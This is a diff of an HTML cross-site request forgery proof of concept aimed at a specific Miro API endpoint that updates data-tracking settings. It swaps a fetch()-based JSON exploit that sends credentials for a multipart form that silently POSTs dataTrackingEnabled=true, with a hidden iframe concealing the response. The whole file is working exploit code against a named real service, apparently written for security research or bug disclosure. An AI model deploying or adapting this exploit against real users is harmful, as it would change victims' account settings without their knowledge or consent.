@@ -1,28 +1,17 @@
 <!DOCTYPE html>
 <html>
   <body>
-    <h2>CSRF PoC with JSON (via fetch)</h2>
-    <button onclick="exploit()">Click to Execute CSRF</button>
+    <h2>CSRF PoC - multipart/form-data</h2>
+    <form action="https://svc.eu01.miro.com/api/ai-gateway/data-tracking-settings/update/3458764633775730812" 
+          method="POST" 
+          enctype="multipart/form-data" 
+          target="hiddenFrame">
+      
+      <input type="text" name="dataTrackingEnabled" value="true">
+      <input type="submit" value="Submit CSRF Request">
+    </form>
 
-    <script>
-      function exploit() {
-        fetch("https://svc.eu01.miro.com/api/ai-gateway/data-tracking-settings/update/3458764633775730812", {
-          method: "POST",
-          credentials: "include",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify({
-            dataTrackingEnabled: true
-          })
-        }).then(r => {
-          if (r.ok) {
-            alert("CSRF request succeeded.");
-          } else {
-            alert("CSRF request failed. Status: " + r.status);
-          }
-        }).catch(e => alert("Network error: " + e));
-      }
-    </script>
+    <!-- Hide request response -->
+    <iframe name="hiddenFrame" style="display:none;"></iframe>
   </body>
 </html>
